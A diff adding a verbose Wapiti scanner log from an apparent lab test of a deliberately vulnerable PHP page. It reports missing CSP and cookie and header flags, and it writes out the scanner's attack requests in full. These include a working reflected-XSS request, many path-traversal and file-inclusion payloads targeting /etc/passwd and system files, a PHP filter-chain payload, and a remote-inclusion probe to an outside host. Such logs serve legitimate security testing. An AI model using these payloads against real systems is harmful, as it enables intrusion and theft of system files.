@@ -1,0 +1,167 @@
+2024-03-20 16:50:49.665 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xss_ajax_2-2.php?title=fuzz (0)
+2024-03-20 16:50:49.797 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 16:50:49.797 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_05a04e9c.db
+2024-03-20 16:50:49.799 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
+2024-03-20 16:50:49.830 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 16:50:49.830 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 16:50:49.907 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 16:50:49.943 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 16:50:49.944 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 16:50:49.959 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_ajax_2-2.php?title=fuzz (0)
+2024-03-20 16:50:49.970 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 16:50:50.051 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 16:50:50.068 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_ajax_2-2.php?title=fuzz (0)
+2024-03-20 16:50:50.068 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/xss_ajax_2-2.php?title=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-20 16:50:50.076 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/xss_ajax_2-2.php?title=%2F%2Fopenbugbounty.org%2F
+2024-03-20 16:50:50.099 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 16:50:50.132 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 16:50:50.147 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_ajax_2-2.php?title=fuzz (0)
+2024-03-20 16:50:50.157 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/xss_ajax_2-2.php?title=%3CScRiPt%3Ealert%28%27w20yklzhzm%27%29%3C%2FsCrIpT%3E (0)
+2024-03-20 16:50:50.219 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:205 - ---
+2024-03-20 16:50:50.219 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:206 - Reflected Cross Site Scripting in http://web/xss_ajax_2-2.php via injection in the parameter title
+2024-03-20 16:50:50.219 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:216 - Evil request:
+2024-03-20 16:50:50.219 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:217 -     GET /xss_ajax_2-2.php?title=%3CScRiPt%3Ealert%28%27w20yklzhzm%27%29%3C%2FsCrIpT%3E HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: security_level=0
+2024-03-20 16:50:50.220 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:218 - ---
+2024-03-20 16:50:50.234 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 16:50:50.246 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_ajax_2-2.php?title=fuzz (0)
+2024-03-20 16:50:50.249 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
+2024-03-20 16:50:50.256 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
+2024-03-20 16:50:50.262 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=%2Fetc%2Fpasswd (0)
+2024-03-20 16:50:50.269 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:50:50.275 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.281 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.291 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+2024-03-20 16:50:50.297 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
+2024-03-20 16:50:50.303 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
+2024-03-20 16:50:50.308 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.314 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.321 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
+2024-03-20 16:50:50.326 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
+2024-03-20 16:50:50.332 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
+2024-03-20 16:50:50.338 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:50:50.344 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:50:50.350 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:50:50.356 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:50:50.362 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.368 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.374 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.379 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.386 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.391 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.397 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.404 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.410 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
+2024-03-20 16:50:50.417 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:50:50.423 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:50:50.428 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:50:50.435 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:50:50.441 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.446 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.453 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.458 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.464 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.470 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.476 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.482 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.488 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:50:50.494 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:50:50.501 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:50:50.507 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:50:50.513 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.520 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.525 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.531 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.538 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.544 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.551 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.557 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.563 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=file%3A%2F%2F%2Fetc%2Fpasswd (0)
+2024-03-20 16:50:50.569 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+2024-03-20 16:50:50.575 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
+2024-03-20 16:50:50.581 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:50:50.588 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.594 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.603 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:50:50.612 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:50:50.619 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=xss_ajax_2-2.php (0)
+2024-03-20 16:50:50.625 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=xss_ajax_2-2.php%00 (0)
+2024-03-20 16:50:50.631 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_ajax_2-2.php?title=xss_ajax_2-2.php%3A%3A%24DATA (0)
+2024-03-20 16:50:50.661 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 16:50:50.675 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_ajax_2-2.php?title=fuzz (0)
+2024-03-20 16:50:50.675 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
+2024-03-20 16:50:50.675 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
+2024-03-20 16:50:50.714 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
+2024-03-20 16:50:50.772 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 16:50:50.786 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_ajax_2-2.php?title=fuzz (0)
+2024-03-20 16:50:50.793 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 16:50:50.793 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 16:50:50.877 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
